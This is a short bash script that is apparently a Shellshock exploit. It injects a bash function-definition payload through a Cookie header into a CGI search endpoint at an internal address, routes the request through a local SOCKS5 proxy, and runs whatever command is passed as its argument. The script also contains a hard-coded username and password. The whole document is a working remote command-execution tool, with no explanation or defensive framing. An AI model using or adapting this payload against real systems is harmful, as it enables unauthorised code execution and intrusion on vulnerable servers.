#!/bin/bash
foo="Cookie: () { :; }; echo 'Content-Type: text/plain';echo;echo;"
curl --socks5 localhost:5000 -s -H "$foo $1" -u user12:BiPGt1wwBE5ccXN/1EPEPA== http://10.10.20.100:8812/cgi-bin/search | grep .  
